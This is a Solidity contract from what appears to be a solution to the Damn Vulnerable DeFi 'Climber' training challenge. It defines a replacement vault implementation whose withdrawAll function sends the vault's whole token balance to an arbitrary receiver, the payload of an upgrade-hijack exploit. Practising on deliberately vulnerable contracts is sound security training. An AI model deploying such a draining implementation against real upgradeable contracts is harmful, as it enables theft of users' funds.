// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";




contract PawnedClimberVault is ClimberVault {
    /// @custom:oz-upgrades-unsafe-allow constructor

    constructor() {
        _disableInitializers();
    }

    function withdrawAll(address tokenAddress, address receiver) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(receiver, token.balanceOf(address(this))), "transfer failed");
    }

}